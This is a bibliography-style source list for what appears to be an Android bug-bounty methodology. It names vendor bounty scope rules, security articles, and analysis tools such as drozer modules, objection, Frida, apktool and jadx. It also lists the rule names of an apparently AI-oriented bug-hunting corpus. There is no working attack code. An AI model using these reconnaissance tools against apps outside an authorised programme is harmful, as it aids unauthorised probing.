- **Vendor programme rules:** Google Mobile VRP (orphaned permissions named in scope; "Permission Bypasses: bypassing system, signature, or dangerous permissions to obtain sensitive user data"), Google Invalid Reports (excessive permissions, backups-enabled), Xiaomi mobile out-of-scope list, Samsung developer-mode downgrade factor, YesWeHack Android recon guidance on third-party-app PoCs, Intigriti triage standard.
- **Community and tooling corpus:** Oversecured ("Common mistakes when using permissions in Android", "Content Providers and the potential weak spots they can have", the SDK-security post), CommonsWare "Vulnerabilities with Custom Permissions" (first-one-in-wins), MobSF `manifest_analysis.py` rule keys, QARK `android_path.py`, Android Lint `CustomPermissionTypo`, drozer (`app.package.attacksurface`, `app.activity.info -u`, `app.provider.info`, `app.package.backup`, `scanner.misc.secretcodes`), objection (`android hooking list receivers`), Frida, `aapt2`, `apkanalyzer`, `apktool`, `jadx`, `xmlstarlet`, `bmgr`, HackTricks Android pages, and the sec-88 / Het Mehta / hackwithsingh / sh4hin / sehno checklist set.
- **Claude-BugHunter (elementalsouls) corpus:** the Shell-Loop Ban and result-counting rule, Marker Discipline, the Body-Diff Rule, Server-Policy-vs-State, the 7-Question Gate and Pre-Severity Gate, the layer-ordering trap, the shadow-API mobile-to-backend bridge, the five-screenshot state-change pattern and PII-split evidence hygiene, chain-filing order, and the NEVER SUBMIT list.
